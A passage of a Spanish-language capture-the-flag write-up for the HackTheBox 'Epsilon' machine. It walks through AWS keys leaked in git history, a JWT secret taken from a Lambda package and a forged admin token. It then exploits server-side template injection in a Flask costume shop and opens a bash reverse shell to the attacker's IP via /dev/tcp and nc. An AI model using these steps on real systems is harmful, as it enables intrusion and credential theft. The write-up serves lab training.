<span class="k">def</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">username</span><span class="o">=</span><span class="n">jwt</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">HS256</span><span class="sh">'</span><span class="p">,])[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
		<span class="k">if</span> <span class="n">username</span><span class="p">:</span>
			<span class="k">return</span> <span class="bp">True</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">return</span> <span class="bp">False</span>
	<span class="k">except</span><span class="p">:</span>
		<span class="k">return</span> <span class="bp">False</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
	<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span><span class="o">==</span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span> <span class="ow">and</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span><span class="o">==</span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="p">:</span>
			<span class="n">res</span> <span class="o">=</span> <span class="nf">make_response</span><span class="p">()</span>
			<span class="n">username</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
			<span class="n">token</span><span class="o">=</span><span class="n">jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">({</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="p">},</span><span class="n">secret</span><span class="p">,</span><span class="n">algorithm</span><span class="o">=</span><span class="sh">"</span><span class="s">HS256</span><span class="sh">"</span><span class="p">)</span>
			<span class="n">res</span><span class="p">.</span><span class="nf">set_cookie</span><span class="p">(</span><span class="sh">"</span><span class="s">auth</span><span class="sh">"</span><span class="p">,</span><span class="n">token</span><span class="p">)</span>
			<span class="n">res</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">location</span><span class="sh">'</span><span class="p">]</span><span class="o">=</span><span class="sh">'</span><span class="s">/home</span><span class="sh">'</span>
			<span class="k">return</span> <span class="n">res</span><span class="p">,</span><span class="mi">302</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/home</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
	<span class="k">if</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">auth</span><span class="sh">'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
		<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">home.html</span><span class="sh">'</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/track</span><span class="sh">"</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">track</span><span class="p">():</span>
	<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
		<span class="k">if</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">auth</span><span class="sh">'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
			<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">track.html</span><span class="sh">'</span><span class="p">,</span><span class="n">message</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">track.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/order</span><span class="sh">'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">order</span><span class="p">():</span>
	<span class="k">if</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">auth</span><span class="sh">'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
		<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
			<span class="n">costume</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">"</span><span class="s">costume</span><span class="sh">"</span><span class="p">]</span>
			<span class="n">message</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
			Your order of </span><span class="sh">"</span><span class="s">{}</span><span class="sh">"</span><span class="s"> has been placed successfully.
			</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">costume</span><span class="p">)</span>
			<span class="n">tmpl</span><span class="o">=</span><span class="nf">render_template_string</span><span class="p">(</span><span class="n">message</span><span class="p">,</span><span class="n">costume</span><span class="o">=</span><span class="n">costume</span><span class="p">)</span>
			<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">order.html</span><span class="sh">'</span><span class="p">,</span><span class="n">message</span><span class="o">=</span><span class="n">tmpl</span><span class="p">)</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">order.html</span><span class="sh">'</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="sh">'</span><span class="s">true</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>En <code class="language-plaintext highlighter-rouge">server.py</code> podemos ver que verifica el <code class="language-plaintext highlighter-rouge">jwt</code> podemos crear uno pero en estos casos necesitamos el <code class="language-plaintext highlighter-rouge">secret</code> para que esa valido el problema es que no lo tenemos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/4.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/5.png" />
</p>

<ul>
  <li>Si vemos el otro c√≥digo ya se esta empleando AWS <a href="https://aws.amazon.com/es/what-is-aws/">https://aws.amazon.com/es/what-is-aws/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">cat </span>track_api_CR_148.py
import io
import os
from zipfile import ZipFile
from boto3.session import Session


session <span class="o">=</span> Session<span class="o">(</span>
    <span class="nv">aws_access_key_id</span><span class="o">=</span><span class="s1">'&lt;aws_access_key_id&gt;'</span>,
    <span class="nv">aws_secret_access_key</span><span class="o">=</span><span class="s1">'&lt;aws_secret_access_key&gt;'</span>,
    <span class="nv">region_name</span><span class="o">=</span><span class="s1">'us-east-1'</span>,
    <span class="nv">endpoint_url</span><span class="o">=</span><span class="s1">'http://cloud.epsilon.htb'</span><span class="o">)</span>
aws_lambda <span class="o">=</span> session.client<span class="o">(</span><span class="s1">'lambda'</span><span class="o">)</span>


def files_to_zip<span class="o">(</span>path<span class="o">)</span>:
    <span class="k">for </span>root, <span class="nb">dirs</span>, files <span class="k">in </span>os.walk<span class="o">(</span>path<span class="o">)</span>:
        <span class="k">for </span>f <span class="k">in </span>files:
            full_path <span class="o">=</span> os.path.join<span class="o">(</span>root, f<span class="o">)</span>
            archive_name <span class="o">=</span> full_path[len<span class="o">(</span>path<span class="o">)</span> + len<span class="o">(</span>os.sep<span class="o">)</span>:]
            yield full_path, archive_name


def make_zip_file_bytes<span class="o">(</span>path<span class="o">)</span>:
    buf <span class="o">=</span> io.BytesIO<span class="o">()</span>
    with ZipFile<span class="o">(</span>buf, <span class="s1">'w'</span><span class="o">)</span> as z:
        <span class="k">for </span>full_path, archive_name <span class="k">in </span>files_to_zip<span class="o">(</span><span class="nv">path</span><span class="o">=</span>path<span class="o">)</span>:
            z.write<span class="o">(</span>full_path, archive_name<span class="o">)</span>
    <span class="k">return </span>buf.getvalue<span class="o">()</span>


def update_lambda<span class="o">(</span>lambda_name, lambda_code_path<span class="o">)</span>:
    <span class="k">if </span>not os.path.isdir<span class="o">(</span>lambda_code_path<span class="o">)</span>:
        raise ValueError<span class="o">(</span><span class="s1">'Lambda directory does not exist: {0}'</span>.format<span class="o">(</span>lambda_code_path<span class="o">))</span>
    aws_lambda.update_function_code<span class="o">(</span>
        <span class="nv">FunctionName</span><span class="o">=</span>lambda_name,
        <span class="nv">ZipFile</span><span class="o">=</span>make_zip_file_bytes<span class="o">(</span><span class="nv">path</span><span class="o">=</span>lambda_code_path<span class="o">))</span>
</code></pre></div></div>

<ul>
  <li>Adem√°s se esta empleando lambda en Python3 es una funci√≥n an√≥nima pero vemos que si tiene algo que ver con AWS.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/6.png" />
</p>

<h2 id="aws-lambda">AWS Lambda</h2>

<ul>
  <li>
    <p>Para podemos enumerar este servicio necesitamos instalar <code class="language-plaintext highlighter-rouge">AWS</code> en nuestro equipo.</p>
  </li>
  <li>
    <p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3</a>.</p>
  </li>
  <li>
    <p><a href="https://docs.aws.amazon.com/es_es/cli/latest/userguide/getting-started-install.html">https://docs.aws.amazon.com/es_es/cli/latest/userguide/getting-started-install.html</a>.</p>
  </li>
  <li>
    <p><a href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security">https://cloud.hacktricks.xyz/pentesting-cloud/aws-security</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ curl <span class="s2">"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip"</span> <span class="nt">-o</span> <span class="s2">"awscliv2.zip"</span>
‚ùØ unzip awscliv2.zip
‚ùØ <span class="nb">sudo</span> ./aws/install
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
You can now run: /usr/local/bin/aws <span class="nt">--version</span>
</code></pre></div></div>

<ul>
  <li>Ahora si ya lo tenemos instalado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ aws <span class="nt">-h</span>

usage: aws <span class="o">[</span>options] &lt;<span class="nb">command</span><span class="o">&gt;</span> &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...] <span class="o">[</span>parameters]
To see <span class="nb">help </span>text, you can run:

  aws <span class="nb">help
  </span>aws &lt;<span class="nb">command</span><span class="o">&gt;</span> <span class="nb">help
  </span>aws &lt;<span class="nb">command</span><span class="o">&gt;</span> &lt;subcommand&gt; <span class="nb">help

</span>aws: error: the following arguments are required: <span class="nb">command</span>
</code></pre></div></div>

<ul>
  <li>
    <p>En el script de Python3 donde nos hablaban de AWS y lambda nos dieron un subdominio el cual es el <code class="language-plaintext highlighter-rouge">endpoint_url</code>.</p>
  </li>
  <li>
    <p>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">echo</span> <span class="s2">"10.10.11.134 cloud.epsilon.htb epsilon.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.134 cloud.epsilon.htb epsilon.htb
</code></pre></div></div>

<ul>
  <li>Para enumerar el servicio necesitamos una key as√≠ que vamos a enumerar el repositorio para ver si en alg√∫n momento la clave si estaba antes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ git log
commit c622771686bd74c16ece91193d29f85b5f9ffa91 <span class="o">(</span>HEAD -&gt; master<span class="o">)</span>
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 17:41:07 2021 +0000

    Fixed Typo

commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 10:02:59 2021 +0000

    Adding Costume Site

commit c51441640fd25e9fba42725147595b5918eba0f1
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 10:00:58 2021 +0000

    Updatig Tracking API

commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module
</code></pre></div></div>

<ul>
  <li>Vamos a inspeccionar este.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ git show 7cf92a7a09e523c1c667d13847c9ba22464412f3
</code></pre></div></div>

<ul>
  <li>Vemos la informaci√≥n que necesitamos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/7.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">aws_access_key_id</span><span class="o">=</span><span class="s1">'AQLA5M37BDN6FJP76TDC'</span>,
+aws_secret_access_key<span class="o">=</span><span class="s1">'OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A'</span>,
</code></pre></div></div>

<ul>
  <li>Vamos a configurar todo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ aws configure
AWS Access Key ID <span class="o">[</span>None]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key <span class="o">[</span>None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
Default region name <span class="o">[</span>None]: us-east-1
Default output format <span class="o">[</span>None]: json
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora vamos a conectarnos al <code class="language-plaintext highlighter-rouge">endpoint</code>.</p>
  </li>
  <li>
    <p>Y agregamos lo de lambda para ver las funciones.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ aws <span class="nt">--endpoint-url</span><span class="o">=</span>http://cloud.epsilon.htb lambda list-functions
<span class="o">{</span>
    <span class="s2">"Functions"</span>: <span class="o">[</span>
        <span class="o">{</span>
            <span class="s2">"FunctionName"</span>: <span class="s2">"costume_shop_v1"</span>,
            <span class="s2">"FunctionArn"</span>: <span class="s2">"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1"</span>,
            <span class="s2">"Runtime"</span>: <span class="s2">"python3.7"</span>,
            <span class="s2">"Role"</span>: <span class="s2">"arn:aws:iam::123456789012:role/service-role/dev"</span>,
            <span class="s2">"Handler"</span>: <span class="s2">"my-function.handler"</span>,
            <span class="s2">"CodeSize"</span>: 478,
            <span class="s2">"Description"</span>: <span class="s2">""</span>,
            <span class="s2">"Timeout"</span>: 3,
            <span class="s2">"LastModified"</span>: <span class="s2">"2024-07-05T00:05:15.900+0000"</span>,
            <span class="s2">"CodeSha256"</span>: <span class="s2">"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw="</span>,
            <span class="s2">"Version"</span>: <span class="s2">"</span><span class="nv">$LATEST</span><span class="s2">"</span>,
            <span class="s2">"VpcConfig"</span>: <span class="o">{}</span>,
            <span class="s2">"TracingConfig"</span>: <span class="o">{</span>
                <span class="s2">"Mode"</span>: <span class="s2">"PassThrough"</span>
            <span class="o">}</span>,
            <span class="s2">"RevisionId"</span>: <span class="s2">"d44f236b-458b-4d09-9fb3-dcabbb784baa"</span>,
            <span class="s2">"State"</span>: <span class="s2">"Active"</span>,
            <span class="s2">"LastUpdateStatus"</span>: <span class="s2">"Successful"</span>,
            <span class="s2">"PackageType"</span>: <span class="s2">"Zip"</span>
        <span class="o">}</span>
    <span class="o">]</span>
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Vemos que hay un <code class="language-plaintext highlighter-rouge">.zip</code> de la funci√≥n <code class="language-plaintext highlighter-rouge">costume_shop_v1</code> vamos a ver mas informaci√≥n.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ aws <span class="nt">--endpoint-url</span><span class="o">=</span>http://cloud.epsilon.htb lambda get-function <span class="nt">--function-name</span><span class="o">=</span>costume_shop_v1 | jq
<span class="o">{</span>
  <span class="s2">"Configuration"</span>: <span class="o">{</span>
    <span class="s2">"FunctionName"</span>: <span class="s2">"costume_shop_v1"</span>,
    <span class="s2">"FunctionArn"</span>: <span class="s2">"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1"</span>,
    <span class="s2">"Runtime"</span>: <span class="s2">"python3.7"</span>,
    <span class="s2">"Role"</span>: <span class="s2">"arn:aws:iam::123456789012:role/service-role/dev"</span>,
    <span class="s2">"Handler"</span>: <span class="s2">"my-function.handler"</span>,
    <span class="s2">"CodeSize"</span>: 478,
    <span class="s2">"Description"</span>: <span class="s2">""</span>,
    <span class="s2">"Timeout"</span>: 3,
    <span class="s2">"LastModified"</span>: <span class="s2">"2024-07-05T00:05:15.900+0000"</span>,
    <span class="s2">"CodeSha256"</span>: <span class="s2">"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw="</span>,
    <span class="s2">"Version"</span>: <span class="s2">"</span><span class="nv">$LATEST</span><span class="s2">"</span>,
    <span class="s2">"VpcConfig"</span>: <span class="o">{}</span>,
    <span class="s2">"TracingConfig"</span>: <span class="o">{</span>
      <span class="s2">"Mode"</span>: <span class="s2">"PassThrough"</span>
    <span class="o">}</span>,
    <span class="s2">"RevisionId"</span>: <span class="s2">"d44f236b-458b-4d09-9fb3-dcabbb784baa"</span>,
    <span class="s2">"State"</span>: <span class="s2">"Active"</span>,
    <span class="s2">"LastUpdateStatus"</span>: <span class="s2">"Successful"</span>,
    <span class="s2">"PackageType"</span>: <span class="s2">"Zip"</span>
  <span class="o">}</span>,
  <span class="s2">"Code"</span>: <span class="o">{</span>
    <span class="s2">"Location"</span>: <span class="s2">"http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"</span>
  <span class="o">}</span>,
  <span class="s2">"Tags"</span>: <span class="o">{}</span>
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Tenemos la ubicaci√≥n del archivo <code class="language-plaintext highlighter-rouge">.zip</code> vamos a descargarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
<span class="nt">--2024-07-04</span> 18:56:30--  http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
Resolving cloud.epsilon.htb <span class="o">(</span>cloud.epsilon.htb<span class="o">)</span>... 10.10.11.134
Connecting to cloud.epsilon.htb <span class="o">(</span>cloud.epsilon.htb<span class="o">)</span>|10.10.11.134|:80... connected.
HTTP request sent, awaiting response... 200
Length: 478 <span class="o">[</span>application/zip]
Saving to: ‚Äòcode‚Äô

code                          100%[<span class="o">=================================================&gt;]</span>     478  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s

2024-07-04 18:56:30 <span class="o">(</span>6.00 MB/s<span class="o">)</span> - ‚Äòcode‚Äô saved <span class="o">[</span>478/478]

‚ùØ file code
code: Zip archive data, at least v2.0 to extract, compression <span class="nv">method</span><span class="o">=</span>deflate
‚ùØ <span class="nb">mv </span>code code.zip
</code></pre></div></div>

<ul>
  <li>Vemos un script en python3.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ unzip code.zip
Archive:  code.zip
  inflating: lambda_function.py
</code></pre></div></div>

<ul>
  <li>Tenemos un secret.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/8.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">secret</span><span class="o">=</span><span class="s1">'RrXCv`mrNe!K!4+5`wYq'</span> <span class="c">#apigateway authorization for CR-124</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Como se usa <code class="language-plaintext highlighter-rouge">JWT</code> lo mas probable es que sea el <code class="language-plaintext highlighter-rouge">secret</code> que necesitamos que vimos en el secret.py cuando enumeramos el <code class="language-plaintext highlighter-rouge">.git</code>.</p>
  </li>
  <li>
    <p>Ahora que tenemos el <code class="language-plaintext highlighter-rouge">secret</code> podemos construir el JWT bas√°ndonos en el script que nos comparten la sintaxis <a href="https://pyjwt.readthedocs.io/en/stable/">https://pyjwt.readthedocs.io/en/stable/</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ python3
Python 3.11.9 <span class="o">(</span>main, Apr 10 2024, 13:16:36<span class="o">)</span> <span class="o">[</span>GCC 13.2.0] on linux
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> import jwt
<span class="o">&gt;&gt;&gt;</span> jwt.encode<span class="o">({</span><span class="s1">'username'</span>: <span class="s1">'admin'</span><span class="o">}</span>, <span class="s1">'RrXCv`mrNe!K!4+5`wYq'</span>, <span class="nv">algorithm</span><span class="o">=</span><span class="s2">"HS256"</span><span class="o">)</span>
<span class="s1">'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4'</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a incorporarla como una <code class="language-plaintext highlighter-rouge">cookie</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/9.png" />
</p>

<ul>
  <li>Si vamos ala ruta <code class="language-plaintext highlighter-rouge">/home</code> vemos que ya no nos lleva al panel de <code class="language-plaintext highlighter-rouge">login</code> por que estamos conectados.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/10.png" />
</p>

<ul>
  <li>Vamos a crear una orden</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/11.png" />
</p>

<ul>
  <li>Como esta corriendo flask por detr√°s como vimos en el script de Python3 y podemos ver el output de algo que podemos ver por pantalla puede ser vulnerable a SSTI vamos capturar la petici√≥n con Burpsuite al darle click a order para enumerar <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/12.png" />
</p>

<ul>
  <li>Vemos que se crea.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/13.png" />
</p>

<ul>
  <li>Si cambiamos el nombre del <code class="language-plaintext highlighter-rouge">costume</code> vemos que funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/14.png" />
</p>

<ul>
  <li>Vamos a comprobar si es vulnerable con la t√≠pica operaci√≥n de 7x7 si vemos el resultado reflejado sabremos que es vulnerable <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/15.png" />
</p>

<ul>
  <li>
    <p>Vemos que podemos ejecutar comandos como nos dicen en Payload All the Things.</p>
  </li>
  <li>
    <p>Tenemos RCE.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/16.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/temp.png" />
</p>

<h2 id="shell-as-tom">Shell as Tom</h2>

<ul>
  <li>Vamos a enviarnos una reverse <code class="language-plaintext highlighter-rouge">shell</code> a nuestro equipo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">cat </span>index.html
<span class="c">#!/bin/bash</span>

bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.63/443 0&gt;&amp;1
</code></pre></div></div>

<ul>
  <li>Vamos hacer una petici√≥n para ver si la recibimos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/17.png" />
</p>

<ul>
  <li>La recibimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.134 - - <span class="o">[</span>04/Jul/2024 19:25:17] <span class="s2">"GET / HTTP/1.1"</span> 200 -
</code></pre></div></div>

<ul>
  <li>Vamos a ponernos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/18.png" />
</p>

<ul>
  <li>Recibimos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.134] 37428
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>991<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
tom@epsilon:/var/www/app<span class="nv">$ </span><span class="nb">whoami
whoami
</span>tom
tom@epsilon:/var/www/app<span class="err">$</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/var/www/app<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
tom@epsilon:/var/www/app<span class="nv">$ </span>^Z
<span class="o">[</span>1]  + 30566 suspended  nc <span class="nt">-nlvp</span> 443
‚ùØ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1]  + 30566 continued  nc <span class="nt">-nlvp</span> 443
                                    reset xterm
ENTER
tom@epsilon:/var/www/app<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<ul>
  <li>Si analizamos el c√≥digo <code class="language-plaintext highlighter-rouge">app.py</code> podemos ver las credenciales para podernos logearnos al panel de login.</li>
</ul>

